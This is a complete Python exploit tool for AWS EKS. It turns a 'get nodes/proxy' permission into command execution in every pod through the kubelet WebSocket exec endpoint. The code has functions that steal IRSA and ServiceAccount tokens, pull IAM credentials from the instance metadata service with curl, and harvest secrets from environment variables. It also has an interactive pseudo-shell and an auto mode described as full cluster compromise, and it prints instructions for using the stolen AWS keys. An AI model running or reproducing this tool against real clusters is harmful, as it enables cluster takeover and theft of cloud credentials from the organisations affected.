#!/usr/bin/env python3
"""
EKS nodes/proxy RCE Exploit — AWS EKS Specific
================================================

WHAT THIS DOES:
  You have a readonly user/role with ONLY "get nodes/proxy" permission.
  This script gives you FULL RCE into every pod on the cluster.

TWO-STAGE ATTACK:
  Stage 1: Recon via API server /nodes/<node>/proxy/pods (lists ALL pods)
  Stage 2: Exec via direct kubelet :10250 (WebSocket command execution)

WHY STAGE 2 USES DIRECT KUBELET:
  On EKS (and most K8s), the API server proxy doesn't properly forward
  WebSocket query params to kubelet. So we:
    1. Use API server proxy for RECON (listing pods — HTTP GET, works fine)
    2. Get the node's internal IP from the API
    3. Connect directly to kubelet:10250 for EXEC (WebSocket, works perfectly)

  In EKS, kubelet port 10250 is OPEN to all pods in the same VPC by default.
  From a compromised pod, you can reach any node's kubelet directly.

EKS-SPECIFIC FEATURES:
  - Steals IRSA tokens (AWS IAM role credentials from pods)
  - Steals IMDSv2 tokens via curl to 169.254.169.254
  - Detects EKS-specific pods (aws-node, kube-proxy, coredns)
  - Identifies IRSA-annotated pods for AWS privilege escalation
  - Extracts AWS_* environment variables

PREREQUISITES:
  pip3 install websocket-client

USAGE:
  # Set your variables first:
  export EKS_SERVER="https://ABCDE12345.gr7.us-east-1.eks.amazonaws.com"
  export TOKEN="eyJhbGciOiJSUzI1NiIs..."

  # Recon: list all pods on a node
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE --recon

  # RCE: execute command in a pod (auto-detects kubelet IP)
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp-abc -c webapp --command "env"

  # Steal IRSA token from a pod
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp-abc -c webapp --steal-irsa

  # Steal IMDSv2 node credentials
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp-abc -c webapp --steal-imds

  # Full auto-exploit: enumerate all nodes → all pods → extract everything
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --auto

  # Interactive pseudo-shell
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp-abc -c webapp --interactive

  # Direct kubelet (from inside a compromised pod):
  python3 exploit-eks.py --direct https://10.0.1.42:10250 --token $TOKEN \\
    -n production -p webapp-abc -c webapp --command "id"
"""

import argparse
import json
import shlex
import ssl
import sys
import os

try:
    import websocket
except ImportError:
    print("[!] pip3 install websocket-client")
    sys.exit(1)

# ─── Colors ───────────────────────────────────────────────────────────────────

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════╗
║  EKS nodes/proxy RCE Exploit                         ║
║  "readonly" permission → full cluster compromise     ║
╚══════════════════════════════════════════════════════╝{RESET}
""")


# ─── HTTP / WebSocket Helpers ─────────────────────────────────────────────────

def http_get(url, token, timeout=15):
    """HTTPS GET with bearer token using curl for HTTP/1.1 compatibility."""
    import subprocess as _sp
    result = _sp.run(
        ["curl", "-sk", "--http1.1", "--max-time", str(timeout),
         "-H", f"Authorization: Bearer {token}", url],
        capture_output=True, timeout=timeout + 5,
    )
    if result.returncode != 0:
        raise RuntimeError(f"curl failed ({result.returncode}): {result.stderr.decode()}")
    return result.stdout


def safe_json(data, context="response"):
    """Parse JSON with a helpful error on failure (e.g., 403 HTML)."""
    try:
        return json.loads(data)
    except (json.JSONDecodeError, ValueError):
        snippet = data[:300] if isinstance(data, (str, bytes)) else str(data)[:300]
        if isinstance(snippet, bytes):
            snippet = snippet.decode(errors="replace")
        if "403" in snippet or "Forbidden" in snippet:
            raise RuntimeError(
                f"403 Forbidden — you lack permission for this API call.\n"
                f"  Hint: 'get nodes/proxy' does NOT include 'get nodes' or 'list nodes'.\n"
                f"  Use --direct <kubelet-url> to skip the API server, or ensure your\n"
                f"  role also grants 'get' on 'nodes' (the base resource).\n"
                f"  Response: {snippet}"
            )
        raise RuntimeError(f"Failed to parse {context} as JSON: {snippet}")


def ws_exec(ws_url, token, timeout=15):
    """
    WebSocket exec against kubelet.
    Returns (stdout, stderr, exit_status_dict).
    """
    ws = websocket.create_connection(
        ws_url,
        header=[f"Authorization: Bearer {token}"],
        subprotocols=["v4.channel.k8s.io"],
        sslopt={"cert_reqs": ssl.CERT_NONE},
        timeout=timeout,
    )

    stdout_buf = b""
    stderr_buf = b""
    exit_status = None

    while True:
        try:
            _op, data = ws.recv_data()
            if not data:
                break
            channel = data[0]
            payload = data[1:]
            if channel == 1:
                stdout_buf += payload
            elif channel == 2:
                stderr_buf += payload
            elif channel == 3:
                try:
                    exit_status = json.loads(payload.decode())
                except Exception:
                    exit_status = {"raw": payload.decode(errors="replace")}
                break
        except websocket.WebSocketTimeoutException:
            break
        except Exception:
            break

    ws.close()
    return (
        stdout_buf.decode(errors="replace"),
        stderr_buf.decode(errors="replace"),
        exit_status,
    )


# ─── URL Builders ─────────────────────────────────────────────────────────────

def build_exec_url(kubelet_url, ns, pod, container, cmd_args):
    """Build WebSocket URL for kubelet /exec endpoint."""
    from urllib.parse import quote
    parts = "&".join(f"command={quote(c)}" for c in cmd_args)
    scheme = kubelet_url.replace("https://", "wss://").replace("http://", "ws://")
    path = f"/exec/{ns}/{pod}/{container}"
    return f"{scheme}{path}?{parts}&output=1&error=1&stdout=1&stderr=1"


def build_pods_url_apiserver(server, node):
    """Build URL to list pods via API server proxy."""
    return f"{server}/api/v1/nodes/{node}/proxy/pods"


def build_pods_url_direct(kubelet_url):
    """Build URL to list pods via direct kubelet."""
    return f"{kubelet_url}/pods"


# ─── Core Functions ───────────────────────────────────────────────────────────

def get_nodes(server, token):
    """List all cluster nodes via API server. Requires 'list nodes' permission."""
    data = http_get(f"{server}/api/v1/nodes", token)
    return safe_json(data, "nodes list")


def get_node_ip(server, token, node_name):
    """Get a node's InternalIP from the API server. Requires 'get nodes' permission."""
    data = http_get(f"{server}/api/v1/nodes/{node_name}", token)
    node = safe_json(data, f"node {node_name}")
    for addr in node.get("status", {}).get("addresses", []):
        if addr["type"] == "InternalIP":
            return addr["address"]
    return None


def get_node_ip_from_pods(server, token, node_name):
    """
    Fallback: extract node IP from pod status when 'get nodes' is denied.
    Uses nodes/proxy (which we DO have) to list pods, then reads hostIP.
    """
    try:
        pods_data = list_pods_apiserver(server, token, node_name)
        for pod in pods_data.get("items", []):
            host_ip = pod.get("status", {}).get("hostIP")
            if host_ip:
                return host_ip
    except Exception:
        pass
    return None


def list_pods_apiserver(server, token, node):
    """List all pods on a node via API server proxy."""
    url = build_pods_url_apiserver(server, node)
    data = http_get(url, token)
    return safe_json(data, f"pods on {node}")


def list_pods_direct(kubelet_url, token):
    """List all pods on a node via direct kubelet."""
    url = build_pods_url_direct(kubelet_url)
    data = http_get(url, token)
    return safe_json(data, "direct kubelet pods")


def exec_command(kubelet_url, token, ns, pod, container, command, timeout=15):
    """Execute a command in a pod via kubelet WebSocket."""
    if isinstance(command, str):
        try:
            cmd_args = shlex.split(command)
        except ValueError:
            cmd_args = command.split()
    else:
        cmd_args = list(command)
    url = build_exec_url(kubelet_url, ns, pod, container, cmd_args)
    return ws_exec(url, token, timeout)


# ─── EKS-Specific Functions ──────────────────────────────────────────────────

def steal_irsa_token(kubelet_url, token, ns, pod, container):
    """Steal IRSA (IAM Roles for Service Accounts) JWT token from a pod."""
    # IRSA token is mounted at this path
    token_path = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
    stdout, stderr, status = exec_command(
        kubelet_url, token, ns, pod, container, f"cat {token_path}"
    )
    if stdout and stdout.startswith("eyJ"):
        return stdout.strip()
    # Fallback: check AWS_WEB_IDENTITY_TOKEN_FILE env var
    stdout2, _, _ = exec_command(
        kubelet_url, token, ns, pod, container, "env"
    )
    for line in stdout2.splitlines():
        if line.startswith("AWS_WEB_IDENTITY_TOKEN_FILE="):
            path = line.split("=", 1)[1]
            stdout3, _, _ = exec_command(
                kubelet_url, token, ns, pod, container, f"cat {path}"
            )
            if stdout3 and stdout3.startswith("eyJ"):
                return stdout3.strip()
    return None


def steal_imds_creds(kubelet_url, token, ns, pod, container):
    """
    Steal AWS credentials from IMDSv2 via a pod with curl.
    Works if the pod can reach 169.254.169.254 (not blocked by hop limit).
    EKS sets hop-limit=1 for pods by default, but host-network pods bypass this.
    """
    # Step 1: Get IMDSv2 token
    stdout, stderr, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        ["sh", "-c",
         "IMDS_TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' "
         "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null) && "
         "echo \"IMDS_TOKEN=$IMDS_TOKEN\""]
    )
    imds_token = None
    for line in stdout.splitlines():
        if line.startswith("IMDS_TOKEN=") and len(line) > 15:
            imds_token = line.split("=", 1)[1]
            break

    if not imds_token:
        return {"error": "Cannot reach IMDS (hop-limit=1 blocks normal pods, try hostNetwork pod)"}

    # Step 2: Get role name
    stdout2, _, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        ["sh", "-c",
         f"curl -s -H 'X-aws-ec2-metadata-token: {imds_token}' "
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
    )
    role_name = stdout2.strip().split("\n")[0] if stdout2 else ""
    if not role_name:
        return {"error": "No IAM role attached to instance"}

    # Step 3: Get credentials
    stdout3, _, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        ["sh", "-c",
         f"curl -s -H 'X-aws-ec2-metadata-token: {imds_token}' "
         f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"]
    )
    try:
        creds = json.loads(stdout3)
        return {
            "role": role_name,
            "AccessKeyId": creds.get("AccessKeyId"),
            "SecretAccessKey": creds.get("SecretAccessKey"),
            "Token": creds.get("Token", "")[:80] + "...",
        }
    except Exception:
        return {"error": f"Failed to parse creds: {stdout3[:200]}"}


def steal_sa_token(kubelet_url, token, ns, pod, container):
    """Steal the Kubernetes ServiceAccount token from a pod."""
    stdout, _, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    )
    if stdout and stdout.startswith("eyJ"):
        return stdout.strip()
    return None


def get_aws_env(kubelet_url, token, ns, pod, container):
    """Extract all AWS-related environment variables from a pod."""
    stdout, _, _ = exec_command(kubelet_url, token, ns, pod, container, "env")
    aws_vars = {}
    for line in stdout.splitlines():
        if "=" in line:
            key, val = line.split("=", 1)
            if any(key.startswith(p) for p in ["AWS_", "AMAZON_", "EKS_"]):
                aws_vars[key] = val
    return aws_vars


# ─── Recon ────────────────────────────────────────────────────────────────────

def do_recon(server, token, node):
    """Enumerate all pods on a node via API server proxy."""
    print(f"\n{CYAN}{'='*60}")
    print(f"  RECON: Node {node}")
    print(f"{'='*60}{RESET}\n")

    pods_data = list_pods_apiserver(server, token, node)
    items = pods_data.get("items", [])
    print(f"[+] Found {BOLD}{len(items)}{RESET} pods on node\n")

    targets = {"irsa": [], "privileged": [], "hostnet": [], "secrets_env": [], "all": []}

    for pod in items:
        meta = pod.get("metadata", {})
        spec = pod.get("spec", {})
        ns = meta.get("namespace", "?")
        name = meta.get("name", "?")
        annotations = meta.get("annotations", {})
        containers = spec.get("containers", [])

        # Track ALL containers (not just first) for multi-container pods
        for c in containers:
            targets["all"].append({"ns": ns, "pod": name, "container": c.get("name", "?")})

        # IRSA detection
        c_name = containers[0].get("name", "?") if containers else "?"
        role_arn = annotations.get("eks.amazonaws.com/role-arn", "")
        if role_arn:
            targets["irsa"].append({"ns": ns, "pod": name, "container": c_name, "role": role_arn})

        for c in containers:
            sc = c.get("securityContext", {})
            if sc.get("privileged"):
                targets["privileged"].append({"ns": ns, "pod": name, "container": c.get("name")})

            for e in c.get("env", []):
                en = e.get("name", "")
                if any(s in en.upper() for s in ["SECRET", "PASS", "KEY", "TOKEN", "CRED"]):
                    targets["secrets_env"].append({
                        "ns": ns, "pod": name, "container": c.get("name"), "env": en
                    })

        if spec.get("hostNetwork"):
            targets["hostnet"].append({"ns": ns, "pod": name, "container": c_name})

    # Print
    print(f"{BOLD}--- All Pods ---{RESET}")
    for p in targets["all"]:
        prefix = ""
        if p["ns"] == "kube-system":
            prefix = f"{YELLOW}[system]{RESET} "
        print(f"  {prefix}{p['ns']:25s} {p['pod']:45s} [{p['container']}]")

    if targets["irsa"]:
        print(f"\n{RED}{BOLD}[!!!] IRSA Pods (AWS IAM Roles → can access AWS services):{RESET}")
        for p in targets["irsa"]:
            print(f"  {RED}{p['ns']}/{p['pod']} → {p['role']}{RESET}")

    if targets["privileged"]:
        print(f"\n{RED}{BOLD}[!!!] Privileged Pods (container escape possible):{RESET}")
        for p in targets["privileged"]:
            print(f"  {RED}{p['ns']}/{p['pod']} [{p['container']}]{RESET}")

    if targets["hostnet"]:
        print(f"\n{YELLOW}[!] HostNetwork Pods (can reach IMDS, bypass hop-limit):{RESET}")
        for p in targets["hostnet"]:
            print(f"  {YELLOW}{p['ns']}/{p['pod']}{RESET}")

    if targets["secrets_env"]:
        print(f"\n{YELLOW}[!] Pods With Secret Env Vars:{RESET}")
        for p in targets["secrets_env"]:
            print(f"  {p['ns']}/{p['pod']} [{p['container']}] → {p['env']}")

    return targets


# ─── Auto Mode ────────────────────────────────────────────────────────────────

def do_auto(server, token):
    """Full auto: enumerate all nodes → pods → extract all secrets."""
    print(f"{BOLD}[*] AUTO MODE: Full EKS Cluster Compromise{RESET}\n")

    # 1. Get all nodes — try list nodes, fall back to the --node hint
    nodes = []
    try:
        nodes_data = get_nodes(server, token)
        for n in nodes_data.get("items", []):
            name = n["metadata"]["name"]
            ip = None
            for addr in n.get("status", {}).get("addresses", []):
                if addr["type"] == "InternalIP":
                    ip = addr["address"]
            nodes.append({"name": name, "ip": ip})
    except RuntimeError as e:
        print(f"{YELLOW}[!] Cannot list nodes (likely 403 — 'list nodes' not granted).{RESET}")
        print(f"{YELLOW}    Hint: Use --node + --recon manually, or grant 'list nodes' permission.{RESET}")
        print(f"{YELLOW}    Error: {e}{RESET}")
        return []

    print(f"[+] Found {BOLD}{len(nodes)}{RESET} nodes:")
    for n in nodes:
        print(f"    {n['name']} ({n['ip']})")

    all_findings = []

    for node_info in nodes:
        node = node_info["name"]
        node_ip = node_info["ip"]

        if not node_ip:
            # Fallback: extract IP from pod status via nodes/proxy
            node_ip = get_node_ip_from_pods(server, token, node)
        if not node_ip:
            print(f"\n  {YELLOW}[-] Skipping {node}: cannot determine IP{RESET}")
            continue

        kubelet = f"https://{node_ip}:10250"

        print(f"\n{CYAN}{'─'*60}")
        print(f"  Node: {node} → kubelet: {kubelet}")
        print(f"{'─'*60}{RESET}")

        # Recon via API server
        targets = do_recon(server, token, node)

        # Exec via direct kubelet
        for pod_info in targets["all"]:
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            print(f"\n  [>] Exec: {ns}/{pod} [{container}]")

            try:
                stdout, stderr, status = exec_command(
                    kubelet, token, ns, pod, container, "env"
                )
                if stdout:
                    secrets = []
                    for line in stdout.splitlines():
                        upper = line.upper()
                        if any(s in upper for s in [
                            "PASSWORD", "SECRET", "PRIVATE", "AWS_SECRET",
                            "AWS_ACCESS_KEY", "TOKEN=", "CRED", "API_KEY"
                        ]):
                            secrets.append(line)
                    if secrets:
                        print(f"     {RED}[!!!] SECRETS:{RESET}")
                        for s in secrets:
                            print(f"          {RED}{s}{RESET}")
                        all_findings.append({
                            "type": "env_secrets", "node": node, "ns": ns,
                            "pod": pod, "secrets": secrets
                        })
                    else:
                        print(f"     [+] OK ({len(stdout.splitlines())} vars)")
            except Exception as e:
                print(f"     [-] Failed: {e}")

        # Steal SA tokens
        for pod_info in targets["all"]:
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            try:
                sa = steal_sa_token(kubelet, token, ns, pod, container)
                if sa:
                    all_findings.append({
                        "type": "sa_token", "node": node, "ns": ns, "pod": pod,
                        "token_preview": sa[:60] + "..."
                    })
                    print(f"  {GREEN}[+] SA token: {ns}/{pod}: {sa[:40]}...{RESET}")
            except Exception:
                pass

        # Steal IRSA tokens
        for pod_info in targets.get("irsa", []):
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            try:
                irsa = steal_irsa_token(kubelet, token, ns, pod, container)
                if irsa:
                    all_findings.append({
                        "type": "irsa_token", "node": node, "ns": ns, "pod": pod,
                        "role": pod_info.get("role"), "token_preview": irsa[:60] + "..."
                    })
                    print(f"  {RED}{BOLD}[!!!] IRSA TOKEN: {ns}/{pod} → {pod_info.get('role')}{RESET}")
            except Exception:
                pass

        # Try IMDS on hostNetwork pods
        for pod_info in targets.get("hostnet", []):
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            try:
                imds = steal_imds_creds(kubelet, token, ns, pod, container)
                if "AccessKeyId" in imds:
                    all_findings.append({
                        "type": "imds_creds", "node": node, "ns": ns, "pod": pod,
                        "creds": imds
                    })
                    print(f"  {RED}{BOLD}[!!!] IMDS CREDS: {imds['role']} → {imds['AccessKeyId']}{RESET}")
            except Exception:
                pass

    # Summary
    print(f"\n{BOLD}{'='*60}")
    print(f"  ATTACK SUMMARY")
    print(f"{'='*60}{RESET}")
    print(f"  Nodes compromised: {len(nodes)}")
    print(f"  Total findings: {len(all_findings)}")
    for f in all_findings:
        if f["type"] == "env_secrets":
            print(f"  {RED}[SECRET]{RESET} {f['ns']}/{f['pod']}: {len(f['secrets'])} secrets")
        elif f["type"] == "sa_token":
            print(f"  {YELLOW}[SA]{RESET}     {f['ns']}/{f['pod']}: K8s token stolen")
        elif f["type"] == "irsa_token":
            print(f"  {RED}[IRSA]{RESET}   {f['ns']}/{f['pod']} → {f.get('role')}")
        elif f["type"] == "imds_creds":
            print(f"  {RED}[IMDS]{RESET}   {f['ns']}/{f['pod']} → {f['creds'].get('role')}: {f['creds'].get('AccessKeyId')}")

    return all_findings


# ─── Interactive Mode ─────────────────────────────────────────────────────────

def do_interactive(kubelet_url, token, ns, pod, container):
    """Interactive pseudo-shell via repeated exec calls."""
    print(f"\n{GREEN}[*] Pseudo-shell: {ns}/{pod} [{container}]{RESET}")
    print(f"[*] Type commands. 'exit' or Ctrl+C to quit.")
    print(f"[*] Each command is a new exec (no persistent state)\n")

    while True:
        try:
            cmd = input(f"{CYAN}({ns}/{pod}) ${RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exit")
            break
        if not cmd or cmd == "exit":
            break
        try:
            stdout, stderr, _ = exec_command(kubelet_url, token, ns, pod, container, cmd)
            if stdout:
                print(stdout, end="")
            if stderr:
                print(f"{RED}{stderr}{RESET}", end="", file=sys.stderr)
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="EKS nodes/proxy RCE — readonly to full cluster compromise",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{BOLD}Examples:{RESET}

  # Recon a node (via API server)
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE --recon

  # RCE into a pod (auto-resolves kubelet IP from API server)
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp -c webapp --command "env"

  # Steal IRSA token (AWS IAM role)
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp -c webapp --steal-irsa

  # Steal node IMDS credentials (works from hostNetwork pods)
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n kube-system -p aws-node-xxxxx -c aws-node --steal-imds

  # Auto-exploit entire cluster
  %(prog)s --server $EKS_SERVER --token $TOKEN --auto

  # Interactive shell
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp -c webapp --interactive

  # Direct kubelet (from inside a compromised pod in the VPC)
  %(prog)s --direct https://10.0.1.42:10250 --token $TOKEN \\
    -n production -p webapp -c webapp --command "id"
""",
    )

    conn = parser.add_mutually_exclusive_group(required=True)
    conn.add_argument("--server", help="EKS API server URL (https://ABCDE.gr7.us-east-1.eks.amazonaws.com)")
    conn.add_argument("--direct", help="Direct kubelet URL (https://10.0.1.42:10250)")

    parser.add_argument("--token", required=True, help="Bearer token (SA/user with get nodes/proxy)")
    parser.add_argument("--node", help="Target node name (e.g., ip-10-0-1-42.us-east-1.compute.internal)")

    parser.add_argument("-n", "--namespace", help="Target pod namespace")
    parser.add_argument("-p", "--pod", help="Target pod name")
    parser.add_argument("-c", "--container", help="Target container name")

    parser.add_argument("--command", help="Command to run (e.g., 'env', 'id', 'cat /etc/passwd')")
    parser.add_argument("--recon", action="store_true", help="Enumerate all pods on a node")
    parser.add_argument("--auto", action="store_true", help="Auto-exploit entire cluster")
    parser.add_argument("--interactive", action="store_true", help="Interactive pseudo-shell")
    parser.add_argument("--steal-irsa", action="store_true", help="Steal IRSA token from target pod")
    parser.add_argument("--steal-imds", action="store_true", help="Steal IMDS node creds via target pod")
    parser.add_argument("--steal-sa", action="store_true", help="Steal K8s ServiceAccount token")
    parser.add_argument("--timeout", type=int, default=15, help="WebSocket timeout seconds (default: 15)")

    args = parser.parse_args()

    via_apiserver = args.server is not None
    server = args.server
    direct = args.direct

    banner()
    if via_apiserver:
        print(f"[*] EKS Server: {server}")
    else:
        print(f"[*] Direct Kubelet: {direct}")
    print(f"[*] Token: {args.token[:30]}...")

    # ── Auto Mode ──
    if args.auto:
        if not via_apiserver:
            print("[!] --auto requires --server")
            sys.exit(1)
        do_auto(server, args.token)
        return

    # ── Recon Mode ──
    if args.recon:
        if via_apiserver:
            if not args.node:
                print("[!] --recon with --server requires --node")
                sys.exit(1)
            do_recon(server, args.token, args.node)
        else:
            pods = list_pods_direct(direct, args.token)
            items = pods.get("items", [])
            print(f"[+] {len(items)} pods:")
            for p in items:
                ns = p["metadata"]["namespace"]
                name = p["metadata"]["name"]
                cs = [c["name"] for c in p["spec"]["containers"]]
                print(f"  {ns}/{name} {cs}")
        return

    # ── Resolve kubelet URL ──
    need_target = not args.auto and not args.recon
    if need_target and not all([args.namespace, args.pod, args.container]):
        print("[!] Need -n, -p, -c for exec/steal commands")
        sys.exit(1)
    if need_target and via_apiserver and not args.node:
        print("[!] Need --node when using --server (to resolve kubelet IP)")
        sys.exit(1)

    kubelet_url = direct
    if via_apiserver:
        print(f"[*] Resolving kubelet IP for node: {args.node}...")
        node_ip = None
        try:
            node_ip = get_node_ip(server, args.token, args.node)
        except RuntimeError:
            print(f"{YELLOW}[!] 'get nodes' denied — falling back to pod hostIP extraction...{RESET}")
        if not node_ip:
            # Fallback: get IP from pod.status.hostIP via nodes/proxy
            node_ip = get_node_ip_from_pods(server, args.token, args.node)
        if not node_ip:
            print(f"[!] Could not resolve IP for {args.node}")
            print(f"    Hint: Use --direct https://<node-ip>:10250 instead")
            sys.exit(1)
        kubelet_url = f"https://{node_ip}:10250"
        print(f"[*] Kubelet: {kubelet_url}")

    ns, pod, container = args.namespace, args.pod, args.container

    # ── Steal IRSA ──
    if args.steal_irsa:
        print(f"\n{BOLD}[*] Stealing IRSA token from {ns}/{pod}...{RESET}")
        irsa = steal_irsa_token(kubelet_url, args.token, ns, pod, container)
        if irsa:
            print(f"{RED}[!!!] IRSA Token:{RESET}")
            print(irsa)
            print(f"\n{YELLOW}[*] Decode: echo '{irsa}' | cut -d. -f2 | base64 -d 2>/dev/null | jq .{RESET}")
            print(f"{YELLOW}[*] Use with: aws sts assume-role-with-web-identity --role-arn <ROLE_ARN> --role-session-name exploit --web-identity-token <TOKEN>{RESET}")
        else:
            print("[-] No IRSA token found (pod may not have IRSA annotation)")
        # Also show AWS env vars
        aws_env = get_aws_env(kubelet_url, args.token, ns, pod, container)
        if aws_env:
            print(f"\n{YELLOW}[*] AWS env vars in pod:{RESET}")
            for k, v in aws_env.items():
                print(f"  {k}={v}")
        return

    # ── Steal IMDS ──
    if args.steal_imds:
        print(f"\n{BOLD}[*] Stealing IMDS creds via {ns}/{pod}...{RESET}")
        imds = steal_imds_creds(kubelet_url, args.token, ns, pod, container)
        if "AccessKeyId" in imds:
            print(f"{RED}[!!!] AWS Node Credentials:{RESET}")
            print(f"  Role:            {imds['role']}")
            print(f"  AccessKeyId:     {imds['AccessKeyId']}")
            print(f"  SecretAccessKey: {imds['SecretAccessKey']}")
            print(f"  Token:           {imds['Token']}")
            print(f"\n{YELLOW}[*] Use with:{RESET}")
            print(f"  export AWS_ACCESS_KEY_ID={imds['AccessKeyId']}")
            print(f"  export AWS_SECRET_ACCESS_KEY={imds['SecretAccessKey']}")
            print(f"  export AWS_SESSION_TOKEN=<full-token>")
            print(f"  aws sts get-caller-identity")
        else:
            print(f"[-] {imds.get('error', 'Failed')}")
        return

    # ── Steal SA Token ──
    if args.steal_sa:
        print(f"\n{BOLD}[*] Stealing SA token from {ns}/{pod}...{RESET}")
        sa = steal_sa_token(kubelet_url, args.token, ns, pod, container)
        if sa:
            print(f"{GREEN}[+] K8s SA Token:{RESET}")
            print(sa)
            print(f"\n{YELLOW}[*] Test: kubectl auth can-i --list --token='{sa[:40]}...'{RESET}")
        else:
            print("[-] No SA token found")
        return

    # ── Interactive ──
    if args.interactive:
        do_interactive(kubelet_url, args.token, ns, pod, container)
        return

    # ── Command Exec ──
    if args.command:
        stdout, stderr, status = exec_command(
            kubelet_url, args.token, ns, pod, container, args.command, args.timeout
        )
        if stdout:
            print(stdout, end="")
        if stderr:
            print(stderr, end="", file=sys.stderr)
        success = status and status.get("status") == "Success"
        sys.exit(0 if success else 1)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
